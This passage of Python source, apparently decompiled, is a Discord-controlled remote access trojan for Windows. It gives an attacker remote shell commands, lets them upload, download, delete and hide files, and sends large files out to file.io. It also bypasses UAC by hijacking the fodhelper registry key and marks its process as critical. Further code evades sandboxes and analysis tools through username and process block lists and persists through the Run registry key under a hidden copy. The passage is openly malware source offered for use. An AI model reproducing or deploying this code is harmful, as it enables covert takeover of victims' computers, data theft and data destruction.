                await ctx.send(f'Error accessing directory for **{os.getlogin()}**')
        else:  # inserted
            if directory == '<':
                try:
                    os.chdir('..')
                    await ctx.send(f'Moved one directory back for **{os.getlogin()}** -> **{os.getcwd()}**')
                except:
                    await ctx.send(f'Error moving one directory back for **{os.getlogin()}**')

@client.command()
async def ls(ctx, *, usid):
    if usid == clientid:
        output = subprocess.getoutput('dir')
        if output:
            result = output
            numb = len(result)
        if numb < 1:
            await ctx.send(f'Error displaying current directory for **{os.getlogin()}**.')
            return
        if numb > 1:
            temp = os.getenv('TEMP')
            if os.path.isfile(temp + '\\output22.txt'):
                os.system('del %temp%\\output22.txt /f')
            f1 = open(temp + '\\output22.txt', 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + '\\output22.txt', filename='output22.txt')
            await ctx.send(f'Current directory items for **{os.getlogin()}**:\n\n-', file=file)
        else:  # inserted
            await ctx.send(f'Current directory items for **{os.getlogin()}**:\n\n' + result)

@client.command()
async def download(ctx, usid, *, path):
    if usid == clientid:
        try:
            filename = path
            check2 = os.stat(filename).st_size
        except:
            await ctx.send('File path doesn\'t exist.')
        if check2 > 7340032:
            try:
                await ctx.send(f'Please wait while downloading the file from **{os.getlogin()}**...')
                response = requests.post('https://file.io/', files={'file': open(filename, 'rb')}).json()['link']
                await ctx.send(f'Success downloading file from **{os.getlogin()}**. Download link : {response}')
            except:
                await ctx.send('Access denied.')
        else:  # inserted
            try:
                file = discord.File(path, filename=path)
                await ctx.send(f'Success downloading file from **{os.getlogin()}**.', file=file)
            except:
                await ctx.send('Access denied.')

@client.command()
async def upload(ctx, usid, *, path):
    if usid == clientid and ctx.message.attachments:
        try:
            await ctx.message.attachments[0].save(path)
            await ctx.send(f'Saved attachment for **{os.getlogin()}** in **{path}**')
        except WindowsError as e:
            await ctx.send(f'System error uploading attachment in **{path}** for **{os.getlogin()}**')

@client.command()
async def bypass_uac(ctx, *, usid):
    if usid == clientid:
        def isAdmin():
            try:
                is_admin = os.getuid() == 0
                return is_admin
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
        if isAdmin():
            await ctx.send(f'You already have admin privileges against **{os.getlogin()}**!')
            return

        class disable_fsr:
            disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
            revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

            def __enter__(self):
                self.old_value = ctypes.c_long()
                self.success = self.disable(ctypes.byref(self.old_value))

            def __exit__(self, type, value, traceback):
                if self.success:
                    self.revert(self.old_value)
        await ctx.send(f'Started UAC Bypass process on **{os.getlogin()}**')
        isexe = False
        if sys.argv[0].endswith('exe'):
            isexe = True
        if not isexe:
            test_str = sys.argv[0]
            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
            cmd2 = current_dir
            create_reg_path = ' powershell New-Item \"HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command\" -Force '
            os.system(create_reg_path)
            create_trigger_reg_key = ' powershell New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"hi\" -Force '
            os.system(create_trigger_reg_key)
            create_payload_reg_key = 'powershell Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"`(Default`)\" -Value \"\'cmd /c start python \"\"\"\"' + cmd2 + '\"\"' + '\"' + '\"\'\"' + ' -Force'
            os.system(create_payload_reg_key)
        else:  # inserted
            test_str = sys.argv[0]
            current_dir = test_str
            cmd2 = current_dir
            create_reg_path = ' powershell New-Item \"HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command\" -Force '
            os.system(create_reg_path)
            create_trigger_reg_key = ' powershell New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"hi\" -Force '
            os.system(create_trigger_reg_key)
            create_payload_reg_key = 'powershell Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"`(Default`)\" -Value \"\'cmd /c start \"\"\"\"' + cmd2 + '\"\"' + '\"' + '\"\'\"' + ' -Force'
            os.system(create_payload_reg_key)
        with disable_fsr():
            os.system('fodhelper.exe')
        remove_reg = ' powershell Remove-Item \"HKCU:\\Software\\Classes\\ms-settings\" -Recurse -Force '
        os.system(remove_reg)

@client.command()
async def startfile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            os.startfile(filepath)
            await ctx.send(f'**{filepath}** has been executed for **{os.getlogin()}**.')
        except WindowsError as e:
            await ctx.send(f'**{filepath}** cannot be executed for **{os.getlogin()}**.')

@client.command()
async def tasklist(ctx, *, usid):
    if usid == clientid:
        if 1 == 1:
            result = subprocess.getoutput('tasklist')
            numb = len(result)
            if numb < 1:
                await ctx.send(f'Error displaying active tasks for **{os.getlogin()}**')
                return
            if numb > 1990:
                temp = os.getenv('TEMP')
                if os.path.isfile(temp + '\\olist.txt'):
                    os.system('del %temp%\\olist.txt /f')
                f1 = open(temp + '\\olist.txt', 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + '\\olist.txt', filename='olist.txt')
                await ctx.send(f'Active tasks for **{os.getlogin()}** :', file=file)
            else:  # inserted
                await ctx.send(f'Active tasks for **{os.getlogin()}** : ' + result)

@client.command()
async def taskkill(ctx, usid, *, proc):
    if usid == clientid:
        kilproc = 'taskkill /IM \"' + proc + '\" ' + '/f'
        os.system(kilproc)
        process_name = proc
        call = ('TASKLIST', '/FI', 'imagename eq %s' % process_name)
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split('\r\n')[(-1)]
        done = last_line.lower().startswith(process_name.lower())
        if done == False:
            await ctx.send(f'Killed the **{proc}** task for **{os.getlogin()}**')
        else:  # inserted
            if done == True:
                await ctx.send(f'Error killing the **{proc}** task  for **{os.getlogin()}**')

@client.command()
async def delfile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            if os.path.exists(filepath):
                if os.path.isdir(filepath):
                    shutil.rmtree(filepath)
                    await ctx.send(f'Deleted directory **{filepath}** from **{os.getlogin()}**')
                else:  # inserted
                    os.remove(filepath)
                    await ctx.send(f'Deleted file **{filepath}** from **{os.getlogin()}**')
        except WindowsError as e:
            await ctx.send(f'System error trying to delete **{filepath}** from **{os.getlogin()}**')

@client.command()
async def setwp(ctx, *, usid):
    if usid == clientid:
        path = os.path.join(os.getenv('TEMP') + '\\temp.jpg')
        await ctx.message.attachments[0].save(path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        await ctx.send(f'Changed wallpaper for **{os.getlogin()}**')

@client.command()
async def critproc(ctx, *, usid):
    if usid == clientid:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
        if is_admin == True:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
            await ctx.send(f'Successfully set the task to a critical process for **{os.getlogin()}**.')
        else:  # inserted
            await ctx.send(f'Insufficient permissions to critproc for **{os.getlogin()}**')

@client.command()
async def hidefile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            p = os.popen('attrib +h ' + filepath)
            t = p.read()
            p.close()
            await ctx.send(f'**{filepath}** has been hidden for **{os.getlogin()}**')
        except:
            await ctx.send(f'Error hiding **{filepath}** for **{os.getlogin()}**')

@client.command()
async def unhidefile(ctx, usid, *, filepath):
    if usid == clientid:
        try:
            p = os.popen('attrib -h ' + filepath)
            t = p.read()
            p.close()
            await ctx.send(f'**{filepath}** is now visible for **{os.getlogin()}**')
        except:
            await ctx.send(f'Error returning **{filepath}** to visible for **{os.getlogin()}**')

@client.command()
async def key_press(ctx, usid, *, keyname):
    if usid == clientid:
        try:
            pyautogui.press(keyname)
            await ctx.send(f'**{os.getlogin()}** has pressed the **{keyname}** key.')
        except:
            await ctx.send(f'**{keyname}** is not recognized as a key.')

@client.command()
async def screenflip(ctx, *, usid):
    if usid == clientid:
        try:
            screen = rs.get_primary_display()
            start_pos = screen.current_orientation
            pos = abs((start_pos - 90) % 360)
            screen.rotate_to(pos)
            await ctx.send(f'**{os.getlogin()}**\'s screen has been flipped.')
        except:
            await ctx.send(f'**{os.getlogin()}**\'s screen could not be flipped.')

@client.command()
async def hardware_list(ctx, *, usid):
    if usid == clientid:
        message = ''
        message += f'`CPU`: **{psutil.cpu_count()}** cores\n'
        message += f'`RAM`: **{psutil.virtual_memory().total / 1073741824.0}** GB\n'
        message += f"`Hard disk`: **{psutil.disk_usage('/').total / 1073741824.0}** GB\n"
        message += f'`Boot device`: {psutil.disk_partitions()[0].device}'
        await ctx.send(f'Hardware information for **{os.getlogin()}**: \n\n{message}')

@client.command()
async def chdisk(ctx, usid, *, disk):
    if usid == clientid:
        try:
            os.chdir(disk)
            await ctx.send(f'Disk changed to **{disk}** for **{os.getlogin()}**')
        except:
            await ctx.send(f'Error changing disk to **{disk}** for **{os.getlogin()}**')

@client.command()
async def restart(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f'**{os.getlogin()}**\'s PC has been shut down.')
        os.system('shutdown /r /t 1')

@client.command()
async def hidetaskbar(ctx, *, usid):
    if usid == clientid:
        try:
            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
            ctypes.windll.user32.ShowWindow(h, 0)
            await ctx.send(f'**{os.getlogin()}**\'s taskbar has been hidden.')
        except:
            await ctx.send(f'**{os.getlogin()}**\'s taskbar could not be hidden.')

@client.command()
async def showtaskbar(ctx, *, usid):
    if usid == clientid:
        try:
            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
            ctypes.windll.user32.ShowWindow(h, 9)
            await ctx.send(f'**{os.getlogin()}**\'s taskbar has been returned.')
        except:
            await ctx.send(f'**{os.getlogin()}**\'s taskbar couldn\'t be returned.')

@client.command()
async def shell(ctx, usid, *, command=''):
    if usid == clientid:
        if command!= '':
            try:
                output = os.popen(command).read()
                if len(output) > 2000:
                    temp_file = os.path.join(os.getenv('TEMP'), 'output.txt')
                    with open(temp_file, 'w') as file:
                        file.write(output)
                    await ctx.send('Output is too long. Sending as a file.', file=discord.File(temp_file))
                    os.remove(temp_file)
                else:  # inserted
                    if output!= '':
                        await ctx.send(f'Shell output for **{os.getlogin()}**:\n```{output}```')
                    else:  # inserted
                        await ctx.send(f'Output empty for **{os.getlogin()}**')
            except Exception as e:
                await ctx.send(f'An error occurred: {str(e)}')
        await ctx.send(f'Please input a shell command for **{os.getlogin()}**')

def mainfunc():
    bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    bltask = ('vm3dservice', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')
    if hide_after_exec!= False:
        p = os.popen('attrib +h \"' + sys.executable + '\"')
        p.close()
    if antivm!= False:
        result = subprocess.getoutput('tasklist')
        numb = len(result)
        if numb > 0:
            temp = os.getenv('TEMP')
            if os.path.isfile(temp + '\\olist.txt'):
                os.system('del %temp%\\olist.txt /f')
            f1 = open(temp + '\\olist.txt', 'a')
            f1.write(result)
            f1.close()
            final = ''
            with open(f"{os.getenv('TEMP')}\\olist.txt") as A:
                final = A.read().lower()
            for task in bltask:
                if task in final:
                    try:
                        kilproc = 'taskkill /IM \"' + task + '.exe' + '\" ' + '/f'
                        os.system(kilproc)
                    except:
                        sys.exit(0)
        os.remove(f'{temp}\\olist.txt')
        if f'{os.getlogin()}'.lower() in bluser:
            sys.exit(0)
    if autostart!= False and sys.argv[0].endswith('exe'):
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            key_path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            command = 'reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v visuals /t REG_SZ /d \"' + backdoor_location + '\" /f'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'visuals', 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            subprocess.call(command, shell=True)
            p = os.popen('attrib +h \"' + backdoor_location + '\"')
            p.close()
        if not sys.argv[0].endswith(process_name):
            os.startfile(backdoor_location)
            os._exit(0)
if __name__ == '__main__':
    mainfunc()
client.run(token)